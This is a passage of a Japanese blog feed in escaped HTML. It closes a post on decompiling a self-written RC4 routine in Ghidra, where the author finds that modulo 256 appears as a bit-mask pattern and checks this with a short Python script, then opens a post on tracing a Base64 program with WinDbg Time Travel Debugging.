    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;local_10 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_10 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffff00&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;thunk_FUN_00867180&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;undefined &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_10&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_3 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;
         param_2&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_c&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;^&lt;/span&gt;
         &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;
                  &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_8&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;byte &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_10&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;
                  &lt;span class=&quot;token number&quot;&gt;0x800000ff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ちょっと気になるのは、ソースコードで&lt;code class=&quot;language-text&quot;&gt;(i + 1) % 256&lt;/code&gt;としている箇所が、デコンパイル結果では以下のような表現になっている点です。&lt;/p&gt;
&lt;p&gt;※ C言語では&lt;code class=&quot;language-text&quot;&gt;+&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;&amp;amp;&lt;/code&gt;の演算子の優先順位は同一なので、&lt;code class=&quot;language-text&quot;&gt;i + 1&lt;/code&gt;が先に評価されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x800000ff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffff00&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;実際に以下のようなスクリプトを作り試してみると、上記の演算で&lt;code class=&quot;language-text&quot;&gt;% 256&lt;/code&gt;と全く同じ演算結果を得ることができました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mod256&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;n&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    n &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x800000ff&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; n &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        n &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;n &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xffffff00&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; n

&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;250&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;260&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;mod256&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; end&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; __name__ &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    main&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;新たな発見ですね。&lt;/p&gt;
&lt;p&gt;今後リバーシングしたときにこのようなデコンパイル結果を見かけたらmod演算としてリバースエンジニアリングすることができそうです。&lt;/p&gt;
&lt;h3 id=&quot;追記202212&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E8%BF%BD%E8%A8%98202212&quot; aria-label=&quot;追記202212 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;追記(2022/1/2)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mod 256&lt;/code&gt;のコードはどれも上記のような出力になるのかと思ったのですが、結構コンパイラによって出力が違うようで、Twitterで親切な方にコメントいただきました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/0ca6a7d19c256f9c3adbe3288f428f42/0b533/image-6.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 41.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAARlAAAEZQAGA43XUAAABoklEQVQoz1WSy5LaMBBF/RcBZMmWX4UfQABjgzE29jDMI4upQLLJOn+SDz+Rh2GqZnGquq5ut1rqtprmwG63ZbGYk+c5D33Pj9cXnk4P9FVJva9YrZZUVcX5/EjbNOybinJf3rwvz3THll1TUhQFVpLNKQ89+e5AnKTEaUZW1CSrgmixxE8W+FHMfD5ns61YFzuWeUGSpqQz00Td8704kA7+aYzlaA83jNEmSUwmqDBjXF7Q9U+C9sKkfGPsZ7hKITevqOoXcvuGcHycaIao/xjtN3Z1QbgBlpQSaQuDjRQCzxQO8wY/K3CTNTrboLwQ7Wr8dY/OH3FXPUoHOAaZlsg4R0zXSEdjKXPznaGo6/nmmTNcP/pEOi72cOY6OMrGkfa7d9CUFCj7A9Pc14JGuJm+MujCdD9gfxQa4on5ItuWtzypENLBGsS7eTQafSbdNWHi8XiM7/tkWUoYBoaQIAiI45goCvE8TaAVU/cb1jC9JElIzdTKsjSrcabrju/0Zi26rqMxq1LXNafTiaNZkSEeaNuW89Mz1+uV0/Uv0fUf/wEW5vDCKZRq5wAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/0ca6a7d19c256f9c3adbe3288f428f42/8ac56/image-6.webp 240w,
/static/0ca6a7d19c256f9c3adbe3288f428f42/d3be9/image-6.webp 480w,
/static/0ca6a7d19c256f9c3adbe3288f428f42/b0a15/image-6.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/0ca6a7d19c256f9c3adbe3288f428f42/8ff5a/image-6.png 240w,
/static/0ca6a7d19c256f9c3adbe3288f428f42/e85cb/image-6.png 480w,
/static/0ca6a7d19c256f9c3adbe3288f428f42/0b533/image-6.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/0ca6a7d19c256f9c3adbe3288f428f42/0b533/image-6.png&quot;
            alt=&quot;image-6.png&quot;
            title=&quot;image-6.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;引用：&lt;a href=&quot;https://twitter.com/fujitanozomu/status/1477557557103558657?s=20&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;引用元コメント&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回はHarekaze mini CTF 2021の復習を兼ねて、RC4暗号を実装してリバーシングしてみました。&lt;/p&gt;
&lt;p&gt;新しい発見もあったので試してみてよかったです。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3zi4Pew&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;暗号技術 実践活用ガイド&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[C言語で実装したBase64プログラムをWinDbgのTime Travel Debuggingで解析してみる]]></title><link>https://kashiwaba-yuki.com/windows-windbg-009-base64</link><guid isPermaLink="false">https://kashiwaba-yuki.com/windows-windbg-009-base64</guid><pubDate>Thu, 30 Dec 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;今回は独自実装したBase64モジュールをGhidraでデコンパイルした後にWinDbgで処理を追っていきたいと思います。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#base64%E3%81%AE%E5%AE%9F%E8%A3%85%E3%81%A8%E3%83%93%E3%83%AB%E3%83%89&quot;&gt;Base64の実装とビルド&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#base64%E3%81%AE%E5%AE%9F%E8%A3%85%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;Base64の実装について&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#base64%E3%81%A8%E3%81%AF&quot;&gt;Base64とは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#base64%E3%81%AE%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89&quot;&gt;Base64のソースコード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#base64%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E3%83%98%E3%83%83%E3%83%80%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB&quot;&gt;Base64プログラムのヘッダファイル&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#windbg%E3%81%A7time-travel-debugging%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;WinDbgでTime Travel Debuggingを取得する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#base64%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%82%92ghidra%E3%81%A7%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;Base64プログラムをGhidraでデコンパイルする&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#entrypoint%E3%81%8B%E3%82%89main%E9%96%A2%E6%95%B0%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;entrypointからmain関数を特定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#base64encode%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E7%B5%90%E6%9E%9C%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;Base64Encode関数のデコンパイル結果を読む&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#base64decode%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E7%B5%90%E6%9E%9C%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;Base64Decode関数のデコンパイル結果を読む&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#ttd%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%81%AE%E8%A7%A3%E6%9E%90&quot;&gt;TTDトレースの解析&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89&quot;&gt;シンボルファイルのロード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;ブレークポイントを設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#windbg%E3%81%A8ghidra%E3%81%AE%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%83%99%E3%83%BC%E3%82%B9%E3%82%92%E3%81%9D%E3%82%8D%E3%81%88%E3%82%8B&quot;&gt;WinDbgとGhidraのイメージベースをそろえる&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%A7%A3%E6%9E%90%E3%81%97%E3%81%9F%E3%81%84%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AB%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;解析したいポイントにブレークポイントを設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A2%E3%82%BB%E3%83%B3%E3%83%96%E3%83%AA%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;アセンブリを読む&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;base64の実装とビルド&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#base64%E3%81%AE%E5%AE%9F%E8%A3%85%E3%81%A8%E3%83%93%E3%83%AB%E3%83%89&quot; aria-label=&quot;base64の実装とビルド permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Base64の実装とビルド&lt;/h2&gt;
&lt;p&gt;まずは今回の解析に使用するプログラムをビルドします。&lt;/p&gt;
&lt;p&gt;ソースコードは以下のリポジトリにあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/kash1064/Try2WinDbg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/Try2WinDbg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Base64エンコードとデコードのプログラムについては、以下の記事で紹介されているものが&lt;code class=&quot;language-text&quot;&gt;WTFPL v2&lt;/code&gt;で配布されているとのことでしたのでありがたく拝借しました。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/leak4mk0/items/6c7f708dd59d52e0bc5c&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;CでBASE64のエンコード/デコードを行う関数 - Qiita&lt;/a&gt;&lt;/p&gt;
